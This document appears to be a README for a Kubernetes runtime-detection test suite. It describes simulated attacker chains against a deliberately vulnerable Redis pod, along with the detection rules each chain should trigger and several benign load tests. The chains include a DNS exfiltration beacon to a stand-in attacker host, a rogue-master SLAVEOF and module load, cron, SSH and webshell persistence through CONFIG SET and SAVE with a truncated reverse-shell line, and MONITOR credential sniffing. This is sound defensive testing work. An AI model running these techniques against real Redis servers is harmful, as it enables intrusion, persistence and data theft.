# Redis End-to-End Breach Scenarios & Load Tests

This doc accompanies the four `e2e-*.yaml` attack suites and the five new
`load-*` functional tests added to `example/redis-functional-tests.yaml`.
Scope:
- four realistic, assume-breach attacker chains against the vulnerable
  Redis in the `redis` namespace
- five new benign-load patterns that widen the learned ApplicationProfile
  beyond the per-feature unit tests so the profile matches what production
  Redis traffic actually looks like

All scenarios assume the attacker is already *inside the pod network* —
e.g. they landed in the `redis-client` Deployment that ships with
`redis-vulnerable.yaml` via an application-layer compromise. Nothing in
this suite requires external network access to the cluster.

## Scenarios

### E2E-01 — Data exfiltration from a neighbor pod
File: `e2e-01-data-exfiltration.yaml` (16 RESP steps)

Recon (`INFO`, `CLIENT LIST`, `CONFIG GET *`, `DBSIZE`) → key enumeration
(`KEYS *`, `SCAN MATCH user:*|session:*|token:*`) → seed+dump of a
PII-shaped record (`HSET user:42`, `HGETALL`, `GET session:*`, `DUMP`) →
C2 DNS beacon via the CVE-2022-0543 Lua escape (`getent hosts
exfil.attacker.example.com`) → canary key (`SET pwned:bob-e2e-01`).

**Expected drift**: every recon/enumeration command is absent from the
baseline profile learned from `redis-functional-tests.yaml`. Detection
surfaces:
- R0001 unexpected process (`getent`)
- R0005 DNS anomaly (`exfil.attacker.example.com`)
- R0003 syscall anomaly (on the profile-drift side)

Sources:
- Wiz research on CVE-2025-49844 post-compromise data theft and IAM
  pivoting — https://www.wiz.io/blog/wiz-research-redis-rce-cve-2025-49844
- Unit 42 "Modern Kubernetes threats" on SA-token harvesting and API
  enumeration after pod compromise —
  https://unit42.paloaltonetworks.com/modern-kubernetes-threats/

### E2E-02 — SLAVEOF rogue master + malicious module load
File: `e2e-02-slaveof-rogue-master.yaml` (13 RESP steps)

Recon `INFO replication`, `MODULE LIST`, `CONFIG GET dir|dbfilename` →
stage `CONFIG SET dir /tmp` + `dbfilename exp.so` → pivot with `SLAVEOF
attacker-rogue.redis.svc.cluster.local 16379` (also the new-keyword
alias `REPLICAOF`) → attempt `MODULE LOAD /tmp/exp.so` → revert (`SLAVEOF
NO ONE`, restore dir/dbfilename, `CONFIG RESETSTAT`).

**Expected drift**: replication-plane and module-plane commands are
pure drift; the outbound TCP attempt from redis-server to a
non-standard in-cluster peer on port 16379 is an egress anomaly.

Sources:
- Knownsec 404 — RCE exploits of Redis based on master-slave replication
  https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0
- vulhub/redis-rogue-getshell —
  https://github.com/vulhub/redis-rogue-getshell
- Mohnad-AL-saif/Redis-4.x-5.x---Unauthenticated-Code-Execution —
  https://github.com/Mohnad-AL-saif/Redis-4.x-5.x---Unauthenticated-Code-Execution

### E2E-03 — CONFIG SET + SAVE persistence (cron, SSH, webshell)
File: `e2e-03-config-save-cron-persistence.yaml` (20 RESP steps)

Three parallel persistence attempts, each following the canonical
Hackviser/Trend Micro pattern:

1. Cron: FLUSHALL → `SET payload "\n\n*/1 * * * * bash -i >& …\n\n"` →
   `CONFIG SET dir /var/spool/cron/crontabs` + `dbfilename root` → SAVE.
2. SSH: same shape, payload is a fake ssh-rsa line, target is
   `/root/.ssh/authorized_keys`.
3. Webshell: PHP one-liner written to `/var/www/html/shell.php`.

Each SAVE attempts an `open()` against a directory the benign profile
never touches. On a hardened image the write fails, but the failed
`openat()` is the defensive signal.

**Expected drift**: sensitive-file-access (R0010), process/syscall
anomaly (R0003), plus RESP drift on the CONFIG SET pattern.

Sources:
- Hackviser Redis pentesting cheat sheet —
  https://hackviser.com/tactics/pentesting/services/redis
- Trend Micro — Exposed Redis instances abused for RCE and crypto mining
  https://www.trendmicro.com/en_us/research/20/d/exposed-redis-instances-abused-for-remote-code-execution-cryptocurrency-mining.html
- jas502n/Redis-RCE — https://github.com/jas502n/Redis-RCE

### E2E-04 — MONITOR credential sniffing (bonus)
File: `e2e-04-monitor-credential-sniff.yaml` (5 RESP steps)

Decoy `AUTH` + `HSET session:decoy token …` to populate the MONITOR
stream, then `MONITOR` + `CLIENT LIST`, then cleanup. Short, single-rule
scenario for the case where the defender wants to confirm that
MONITOR-as-drift alone is alertable.

Source: Hackviser Redis notes on MONITOR for information disclosure —
https://hackviser.com/tactics/pentesting/services/redis

## Running the scenarios

Same entry-points as the existing single-rule attacks:

```bash
bobctl attack --attack-suite example/redis-tests/e2e-01-data-exfiltration.yaml \
              --service redis --service-port 6379 -n redis

# Or all E2E scenarios at once
for f in example/redis-tests/e2e-*.yaml; do
  bobctl attack --attack-suite "$f" --service redis --service-port 6379 -n redis
done
```

## New load / functional tests

All five new tests live at the bottom of
`example/redis-functional-tests.yaml` under the "Load / traffic-shape
tests" heading. They are ordinary `FunctionalTestSuite` entries, so the
existing runner (`bobctl learn`, `bobctl apply`, local-ci.sh) picks them
up with no flag changes.

| Test name | Pattern | Upstream tool mirrored |
|-----------|---------|------------------------|
| `load-memtier-ratio-10to1`    | 10 SET + 100 GET in one EVAL   | memtier_benchmark default ratio |
| `load-bulk-mset-50` / `-mget-50` | 20-key MSET / MGET in one RESP call | redis-benchmark bulk |
| `load-pubsub-publish-burst`   | 20 PUBLISHes to one channel     | redis-benchmark pub/sub |
| `load-ycsb-workload-a`        | 50 SET + 50 GET interleaved     | YCSB core workload A |
| `load-session-ttl-churn`      | 20 × (SETEX + TTL + DEL)        | memtier session-store profile |

Sources:
- redis-benchmark standard workloads —
  https://redis.io/docs/latest/operate/oss_and_stack/management/optimization/benchmarks/
- memtier_benchmark — https://github.com/redis/memtier_benchmark
- YCSB core workloads — https://github.com/brianfrankcooper/YCSB/wiki/Core-Workloads

The same five patterns are also wired into
`pkg/pkg/autotune/benign_redis.go` so `bobctl learn` emits them against
the live target during profile capture (not only from the YAML runner).
This keeps the autotuned profile and the YAML-replayable suite in sync.
